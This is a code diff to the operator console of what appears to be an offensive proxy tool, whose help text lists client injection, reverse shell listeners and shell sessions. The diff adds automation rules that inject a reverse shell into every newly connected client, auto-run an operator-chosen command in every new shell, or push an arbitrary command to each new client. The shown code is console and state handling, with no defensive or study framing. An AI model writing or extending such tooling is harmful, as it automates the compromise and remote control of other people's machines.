@@ -26,16 +26,22 @@ ASCII_BANNER = r"""
 """
 
 HELP_TEXT = """\
-[bold white]list clients[/bold white]     — connected proxy clients
-[bold white]list shells[/bold white]      — active reverse shell sessions
-[bold white]inject <id>[/bold white]      — open injector for a client
-[bold white]shell <id>[/bold white]       — attach to a shell session
-[bold white]revshell <id>[/bold white]    — start listener + inject revshell to client (auto port)
-[bold white]revshell stop[/bold white]    — kill the listener
-[bold white]server local[/bold white]     — set proxy to local mode
-[bold white]server public[/bold white]    — set proxy to public mode
-[bold white]help[/bold white]             — show this
-[bold white]exit[/bold white]             — quit\
+[bold white]list clients[/bold white]           — connected proxy clients
+[bold white]list shells[/bold white]            — active reverse shell sessions
+[bold white]inject <id>[/bold white]            — open injector for a client
+[bold white]shell <id>[/bold white]             — attach to a shell session
+[bold white]revshell <id>[/bold white]          — start listener + inject revshell to client (auto port)
+[bold white]revshell stop[/bold white]          — kill the listener
+[bold white]rule init revshell[/bold white]     — auto-revshell every new client
+[bold white]rule init revshell + <cmd>[/bold white]  — revshell + auto-run cmd in every new shell
+[bold white]rule init cmd <cmd>[/bold white]    — auto-inject cmd to every new client
+[bold white]rule shell <cmd>[/bold white]       — auto-run cmd in every new shell session
+[bold white]rule clear[/bold white]             — clear all rules
+[bold white]rules[/bold white]                  — show active rules
+[bold white]server local[/bold white]           — set proxy to local mode
+[bold white]server public[/bold white]          — set proxy to public mode
+[bold white]help[/bold white]                   — show this
+[bold white]exit[/bold white]                   — quit\
 """
 
 
@@ -81,11 +87,25 @@ def _print_header():
         )
     else:
         listener = f"  [dim]│[/dim]  [dim]○ no listener[/dim]  [dim]shells:[/dim] {n_sess}"
+    # active rules summary
+    with state._rules_lock:
+        r_init  = state.rule_on_init
+        r_shell = state.rule_on_shell
+    rule_parts = []
+    if r_init == "revshell":
+        rule_parts.append("[yellow]● rule:init→revshell[/yellow]")
+    elif isinstance(r_init, dict) and r_init.get("cmd"):
+        rule_parts.append(f"[yellow]● rule:init→cmd[/yellow] [dim]{r_init['cmd'][:30]!r}[/dim]")
+    if r_shell:
+        rule_parts.append(f"[yellow]● rule:shell→{r_shell[:30]!r}[/yellow]")
+    rules_line = ("  [dim]│[/dim]  " + "  ".join(rule_parts)) if rule_parts else ""
+
     console.print(Panel(
         f"{status}  "
         f"[dim]proxy[/dim] :{state.proxy_port}  "
         f"[dim]│[/dim]  [dim]clients:[/dim] {n_clients}"
-        f"{listener}",
+        f"{listener}"
+        f"{rules_line}",
         border_style="red", expand=False,
     ))
 
@@ -230,6 +250,82 @@ def get_user_cmd():
                 target_ip=state.clients[cid]["ip"],
             )
             last = ("ok" if ok else "error", msg)
+            continue
+
+        # ── rules ─────────────────────────────────────────────────────────────
+        if cmd == "rules":
+            with state._rules_lock:
+                r_i = state.rule_on_init
+                r_s = state.rule_on_shell
+            lines = []
+            if r_i is None and r_s is None:
+                lines.append("[dim]no active rules[/dim]")
+            else:
+                if r_i == "revshell":
+                    lines.append("[yellow]init rule:[/yellow] revshell → every new client gets a shell")
+                elif isinstance(r_i, dict) and r_i.get("cmd"):
+                    lines.append(f"[yellow]init rule:[/yellow] cmd → {r_i['cmd']!r}")
+                if r_s:
+                    lines.append(f"[yellow]shell rule:[/yellow] auto-run {r_s!r} in every new session")
+            last = ("ok", "\n".join(lines))
+            continue
+
+        if cmd == "rule clear":
+            with state._rules_lock:
+                state.rule_on_init  = None
+                state.rule_on_shell = None
+            last = ("ok", "[*] all rules cleared")
+            continue
+
+        if cmd == "rule clear init":
+            with state._rules_lock:
+                state.rule_on_init = None
+            last = ("ok", "[*] init rule cleared")
+            continue
+
+        if cmd == "rule clear shell":
+            with state._rules_lock:
+                state.rule_on_shell = None
+            last = ("ok", "[*] shell rule cleared")
+            continue
+
+        if cmd == "rule init revshell":
+            with state._rules_lock:
+                state.rule_on_init = "revshell"
+            last = ("ok", "[*] init rule set: revshell → every new client will get a shell")
+            continue
+
+        if cmd.startswith("rule init revshell + "):
+            post_cmd = user_input[len("rule init revshell + "):].strip()
+            if not post_cmd:
+                last = ("error", "usage: rule init revshell + <command>")
+                continue
+            with state._rules_lock:
+                state.rule_on_init  = "revshell"
+                state.rule_on_shell = post_cmd
+            last = ("ok",
+                f"[*] init rule set: revshell\n"
+                f"[*] shell rule set: auto-run {post_cmd!r} in every new session")
+            continue
+
+        if cmd.startswith("rule init cmd "):
+            inject_cmd = user_input[len("rule init cmd "):].strip()
+            if not inject_cmd:
+                last = ("error", "usage: rule init cmd <command>")
+                continue
+            with state._rules_lock:
+                state.rule_on_init = {"cmd": inject_cmd}
+            last = ("ok", f"[*] init rule set: inject {inject_cmd!r} to every new client")
+            continue
+
+        if cmd.startswith("rule shell "):
+            shell_cmd = user_input[len("rule shell "):].strip()
+            if not shell_cmd:
+                last = ("error", "usage: rule shell <command>")
+                continue
+            with state._rules_lock:
+                state.rule_on_shell = shell_cmd
+            last = ("ok", f"[*] shell rule set: auto-run {shell_cmd!r} in every new session")
             continue
 
         # ── server ────────────────────────────────────────────────────────────
